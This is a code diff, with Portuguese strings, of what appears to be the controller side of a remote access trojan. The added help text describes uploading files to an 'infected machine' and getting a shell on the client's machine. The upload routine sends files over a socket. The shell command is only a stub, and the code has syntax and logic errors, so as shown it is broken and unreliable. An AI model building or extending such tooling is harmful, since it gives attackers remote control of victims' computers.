@@ -27,6 +27,10 @@ import sys
 # cores
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
+def help():
+    print('Comandos:\nupload - Escolha um arquivo para fazer upload na maquina infectada')
+    print('shell - digite shell, para obter uma shell na maquina do cliente')
+
 def upload(s, caminho_arquivo=False):
     comando = subprocess.Popen('zenity --file-selection --title Escolha_um_arquivo', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     retorno = comando.stdout.read()
@@ -43,10 +47,18 @@ def upload(s, caminho_arquivo=False):
 
 def identifica(comando, s):
     comando = comando.split(' ')
-    if(comando[0]=='upload')
-        upload(s)
-        comando = ' '.join(comando)
-        conexao.send(comando)
+    tam = len(comando)
+    if(tam>1):
+        print('Comando errado ou não existe, digite {0}HELP{1} para obter ajuda dos comandos').format(RED, END)
+    else:
+        if(comando[0]=='upload')
+            upload(s)
+            comando = ' '.join(comando)
+            conexao.send(comando)
+        elif(comando=='shell'):
+            pass
+        else:
+            print('Comando errado ou não existe, digite {0}HELP{1} para obter ajuda dos comandos').format(RED, END)
 
 def conecta(meuIP):
     while True:
@@ -69,10 +81,5 @@ def conecta(meuIP):
                 print('Erro: '+ str(e))
                 break
 
-
-def help():
-    pass
-
 if __name__ == '__main__':
-    meuIP='127.0.0.1'
-    conecta(meuIP)
+    conecta('127.0.0.1')
